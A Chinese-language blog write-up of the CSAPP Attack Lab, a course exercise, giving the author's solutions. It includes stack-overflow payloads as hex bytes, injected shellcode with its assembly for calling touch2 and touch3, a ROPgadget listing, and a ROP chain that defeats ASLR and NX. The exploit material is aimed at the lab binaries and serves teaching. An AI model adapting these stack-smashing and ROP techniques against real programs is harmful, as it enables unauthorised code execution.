
今天顺带把attack lab做完了，算是小小地复习了下栈溢出和ROP吧。

## 使用方法

~~最开始我甚至都不知道这个lab要怎么开始做起，跑都跑不起来~~

`hex2raw`读入以空格作为分隔的一个个字节，编码成一个个机器码。就跟pwntools里面的u32、u64差不多的作用。不然直接输入是没有用的。

直接运行`ctarget`或`rtarget`会没办法运行，报了个`Running on an illegal host`的错误。

我们加个`-q`的参数就能跑了。或者`-i`然后加上文件名，从文件里读入。

运行的方法是这样：

```
$ ./hex2raw < levelx.txt | ./ctarget -q
$ ./hex2raw < levelx.txt | ./rtarget -q
```

## Part 1: Code Injection Attacks

这部分主要是利用了栈溢出，虽然checksec查到了canary，但在那个`Gets`函数里面看看汇编其实是没有的。

同时栈内存可执行，这是Level 2跟3的伏笔。

### Level 1

最简单的`gets`函数溢出，只要用`touch1`的地址覆盖rbp就可以了。

```
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
c0 17 40 00 00 00 00 00
```

{% qnimg CSAPP-Attack-Lab-Writeup/success1.png %}

### Level 2

第二个要求利用栈溢出调用`touch2`，同时携带一个int参数，要求值跟cookie一致。

可以直接ROP解决，而这里因为栈可执行，还有往栈里写shellcode的做法，做下记录。

构造shellcode当然先写汇编，有两种写法：

#### 已知cookie再写入

在`cookie.txt`里面就有cookie的值，我们只要把这个值赋给rdi就可。

```
movq $0x59b997fa, %rdi
pushq $0x004017ec
retq
```

因为是AT&T语法，所以可以直接用`gcc -c`编译出未链接文件，然后我们objdump一下就可以看到对应的shellcode了。

`ret`命令相当于一个`pop rip`，将`rip`指向了`0x4017ec`，即调用了`touch2`。


但是直接写shellcode得能执行啊，怎么让它执行？把rbp的值写成shellcode在栈上的地址。

这里又有一个小细节：**字符串在栈里面通过push写入的话要翻转顺序，而shellcode需要正序写入。**前面要写hello world的shellcode，字符串是反向写入的，因为我们读字符串自然是从低地址到高地址的。而shellcode就直接写就完事了。

所以我们需要获取栈的地址。那我们用gdb调一调就可以找到字符串的地址了：

{% qnimg CSAPP-Attack-Lab-Writeup/level2.png %}

```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

{% qnimg CSAPP-Attack-Lab-Writeup/success2.png %}

#### 从程序中真正获取cookie的值

可以用汇编来获取地址的值，比如这样写：

```
movq $0x006044e4, %rdi
movq (%rdi), %rdi
pushq $0x004017ec
retq
```

这样就算cookie是个随机数，也能跳转，比较普适。

```
48 c7 c7 e4 44 60 00 48
8b 3f 68 ec 17 40 00 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

{% qnimg CSAPP-Attack-Lab-Writeup/success22.png %}

Jan 17 upd：第二种shellcode的汇编也可以这样写：

```
movq 0x006044e4, %rdi
pushq $0x004017ec
retq
```

mov和lea的区别，就是mov会做一次dereference，而lea只进行计算。

只要mov的src不是一个immediate（最前面有一个$号）而是一个地址，默认都会把src这个地址dereference之后的值赋给dest。而lea就只是单纯计算之后把结果赋给dest。

对寄存器的dereference，还是打一个括号。上述强调的是immediate和memory的一个区别。

### Level 3

第三个要求我们继续利用那个漏洞跳入`touch3`，顺便携带一个字符串地址，还要跑过`hexmatch`函数的检测。

我们在基于Level 2在栈上写shellcode的思想，再在栈上储存一个字符串，然后rdi就指向这个字符串的地址，这样才能控制。

我们知道cookie值是0x59b997fa，但是我们要的是字符串且没有起始的0x。

所以我们要弄到"59b997fa"这段字符串，实际上写入的时候就得写入ASCII码了。

但是不能随便在栈里面随便找个地方存，因为后面执行`hexmatch`时，会把部分栈上内容overwrite掉，所以可以找个保险的地方，直接存到rbp紧接着的地址。

shellcode部分：

```
movq $0x5561dca8, %rdi
pushq $0x004018fa
retq
```

这里 解释一下：`0x5561dca8 = 0x5561dc78 + 0x28 + 0x8`

把它翻译成机器码，粘在字符串里：

```
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```

啊？前面不是说字符串要反过来嘛？怎么现在是正的？因为我们不是通过push来写入的。

众所周知，push进去的值是little endian储存的，所以字符串要反过来才是正确的顺序。

{% qnimg CSAPP-Attack-Lab-Writeup/success3.png %}

## Part 2: Return-Oriented Programming

第二部分相比第一部分加上了很多保护：打开了ASLR，NX Enable，把前面在栈里面写shellcode的想法杀死了。现在就可以使用ROP了。

`farm.c`中似乎是些没用的函数，不过当变成机器码并且截取一小部分时，会有意想不到的收货。这个在`attacklab.pdf`里写的很清楚。

而我们大可直接用ROPgadget来做。。。

### Level 2

用ROP来实现前面第二关的效果。直接用一个pop rdi的gadget就可以了。

略。

### Level 3

现在就是真正的拼gadget了。

这里有一个问题：因为还是必须在栈里面存字符串，那怎么获取地址？栈地址已经会变化了。

在看别人博客的时候，看见一个非常非常重要的gadget：

```
0x00000000004019d6 : lea rax, [rdi + rsi] ; ret
```

只要其中一个是栈上的地址，我们控制另一个，就可以获得栈上任意处的地址。

开始扫gadget：

```
--only "mov|ret"
0x0000000000401b23 : mov byte ptr [rax + 0x605500], 0 ; ret
0x0000000000400f63 : mov byte ptr [rip + 0x20454e], 1 ; ret
0x000000000040214e : mov dword ptr [rdi + 8], eax ; ret
0x0000000000401b10 : mov dword ptr [rip + 0x2045ee], eax ; ret
0x0000000000402dd7 : mov eax, 0 ; ret
0x0000000000401994 : mov eax, 1 ; ret
0x0000000000401a07 : mov eax, esp ; ret
0x0000000000401a9a : mov eax, esp ; ret 0x8dc3
0x00000000004019a3 : mov edi, eax ; ret
0x000000000040214d : mov qword ptr [rdi + 8], rax ; ret
0x0000000000401a06 : mov rax, rsp ; ret
0x00000000004019a2 : mov rdi, rax ; ret
0x0000000000400c55 : ret
```

```
--only "pop|ret"
0x00000000004021d5 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00000000004018f5 : pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004011aa : pop rbx ; pop rbp ; ret
0x0000000000401dab : pop rbx ; ret
0x000000000040141b : pop rdi ; ret
0x0000000000402b17 : pop rsi ; pop r15 ; ret
0x0000000000401383 : pop rsi ; ret
0x0000000000402b13 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040137f : pop rsp ; pop r13 ; pop r14 ; ret
0x00000000004021d8 : pop rsp ; pop r13 ; ret
0x00000000004018f8 : pop rsp ; ret
0x0000000000400c55 : ret
```
（略去了一部分没用的gadget）

我们可以先得到rsp的值，mov到rax，然后mov到rdi，这样rdi就拿到了栈顶的地址。

接下来通过pop rsi的gadget，我们再输入偏移，就可以通过前面的lea获取我们输入的字符串的地址。

最后mov到rdi上，就可以跳转到`touch3`了。

```
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
83 13 40 00 00 00 00 00
40 00 00 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
00
```
